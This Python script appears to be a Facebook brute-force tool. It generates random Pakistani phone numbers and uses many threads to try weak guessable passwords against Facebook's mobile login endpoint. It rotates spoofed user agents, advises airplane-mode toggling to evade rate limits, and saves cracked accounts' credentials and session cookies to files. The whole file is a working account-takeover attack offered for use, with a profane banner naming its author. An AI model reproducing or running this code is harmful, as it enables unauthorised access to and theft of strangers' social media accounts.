#!/usr/bin/python3
#-*-coding:utf-8-*-
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;92m' # 
M = '\033[1;32m' # 
H = '\033[1;32m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;92m' # 
U = '\x1b[1;92m' # 
O = '\x1b[1;92m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; VTR-L09 Build/HUAWEIVTR-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.61 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/332.0.0.11.117;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

ugen=[]
for x in range(100):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/profile.php?id=100083290388782')
logo ="""
\033[1;31m
 ⊱❊╌──┈⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌⊰᯽⊱┈──╌❊
               𓆰𝐇𝐒𝐒𝐀𝐍𓆪
    \033[1;31m ███████████████████████████
    \033[1;31m ███████▀▀▀░░░░░░░▀▀▀███████
    \033[1;31m ████▀░░░░░░░░░░░░░░░░░▀████
    \033[1;31m ███│░░░░░░░░░░░░░░░░░░░│███
    \033[1;31m ██▌│░░░░░░░░░░░░░░░░░░░│▐██
    \033[1;31m ██░└┐░░░░░░░░░░░░░░░░░┌┘░██
    \033[1;31m ██░░└┐░░░░░░░░░░░░░░░┌┘░░██
    \033[1;31m ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
    \033[1;31m ██▌░│██████▌░░░▐██████│░▐██
    \033[1;31m ███░│▐███▀▀░░▄░░▀▀███▌│░███
    \033[1;31m ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
    \033[1;31m ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
    \033[1;31m ████▄─┘██▌░░░░░░░▐██└─▄████
    \033[1;31m █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
    \033[1;31m ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
    \033[1;31m █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
    \033[1;31m ███████▄░░░░░░░░░░░▄███████
    \033[1;31m ██████████▄▄▄▄▄▄▄██████████
    \033[1;31m ███████████████████████████
               \033[1;31msᴜʙ ᴋᴀ \033[1;31mʙᴀᴀᴘ
\033[1;31m ⊱❊╌──┈⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌⊰᯽⊱┈──╌❊
🔥                    𓆰𓃮𓆪                      🔥
\033[1;31m██╗  ██╗ █████╗ ███████╗███████╗ █████╗ ███╗   ██╗
\033[1;32m██║  ██║██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
\033[1;33m███████║███████║███████╗███████╗███████║██╔██╗ ██║
\033[1;31m██╔══██║██╔══██║╚════██║╚════██║██╔══██║██║╚██╗██║
\033[1;36m██║  ██║██║  ██║███████║███████║██║  ██║██║ ╚████║
\033[1;31m╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
\033[1;31m
\033[1;31m ⊱❊╌──┈⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌⊰᯽⊱┈──╌❊
 \033[1;36m[🔴]𝐎𝐖𝐍𝐄𝐑          ⚚    [✮]𝐇𝐀𝐒𝐒𝐀𝐍 𝐑𝐀ج𝐏𝐔𝐓
 \033[1;36m[🔴]𝐅𝐎𝐑 𝐇𝐀𝐓𝐄𝐑'𝐒    ⚚    [✮]𝐅𝐔𝐂𝐊 𝐘𝐎𝐔 𝐀𝐋𝐋
 \033[1;36m[🔴]𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐍𝐔𝐌   ⚚    [✮]+𝟏 (𝟗𝟕𝟑) 𝟗𝟔𝟑-𝟗𝟑𝟎𝟑
 \033[1;36m[🔴]𝐆𝐈𝐓𝐇𝐔𝐁 𝐀𝐂𝐂     ⚚    [✮]𝐇𝐒𝐒𝐀𝐍-𝐑𝐀𝐉𝐏𝐔𝐓𝟎  
 \033[1;36m[🔴]𝐕𝐄𝐑𝐒𝐈𝐎𝐍        ⚚    [✮]𝐏𝐑𝐄𝐌𝐈𝐔𝐌 
\033[1;31m⊱❊╌──┈⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌⊰᯽⊱┈──╌❊"""       


def cek_apk(coki):
    session = requests.Session();w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r Ã°Å¸Å½Â®  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
def random_pak_number():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] 𝐏𝐀𝐊 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐄𝐍𝐓𝐄𝐑 𝐂𝐎𝐃𝐄 (92301,92302)')
    kode = input('[?] Input Code : ')
    limit = int(input('How many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[1;97m[•] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
        print('Total ids:\033[m '+tl)
        print(54*'_')
        for guru in user:
            uid = kode+guru
            pwx = [guru,uid,'khankhan','khan1122','khan123456','khan123','khan786','khanbaba']
            yaari.submit(rcrack,uid,pwx,tl)
    print(54*'_')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(54*'_')
    
def random_pak_jsjnumber():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] For Pak Enter Four Digit Code (92302)')
    print(47*'-')
    kode = input('[?] Input Code : ')
    print(47*'-')
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] Total Ids : \033[1;92m'+tl)
        print('\033[1;32;1m[$] Brute Has been started...(\033[1;92mPakistan\033[1;92m)');print(47*"-");print('    USE FLIGHT (\033[1;92mAIRPLANE\033[1;92m) MODE BEFORE USE');print(47*"-")
        for guru in user:
            uid = kode+guru
            bilal = uid[0:6]
            pwx = [guru,bilal,]
            yaari.submit(rcrack,uid,pwx,tl)
    print(47*"-")
    print('[âœ“] Crack process has been completed')
    print('[?] Ids saved in ok.txt,cp.txt')
    print(47*"-")
    print(' Press Inter To Back Menu')
    random_pak_number()
    
agents=[]

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            agents =['Mozilla/5.0 (Linux; Android 9; Infinix X610B Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]','Mozilla/5.0 (Linux; Android 12; Infinix X668 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 12; Infinix X665C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/336.0.0.11.99;]','Mozilla/5.0 (Linux; Android 12; Infinix X665E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]','Mozilla/5.0 (Linux; Android 11; Infinix X665B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/339.0.0.10.100;]','Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.40 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.40 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.548.61 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.54.61 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.547.61 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5477.61 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-G998N Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.15 Mobile Safari/537.3','Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]','Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]','Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]','Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36','Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',]
            session = requests.Session()
            sys.stdout.write('\r[%s/%s]OK:-%s'%(loop,tl,len(oks)))
            sys.stdout.flush()
            pro = random.choice(agents)
            free_fb = session.get('https://x.facebook.com/?tbua=1').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'free.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://free.facebook.com',
    'referer': 'https://free.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'viewport-width': '980',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\33[1;92m[HASSAN-OK🔥] '+uid+' | '+ps+'\33[0;92m')
                print(coki)
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid);cek_apk(coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;91m[ HASSAN-CP🙁] '+uid+' | '+ps+'\33[0;92m')
                open('cp.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
print('chk update')
os.system('git pull')
random_pak_number()
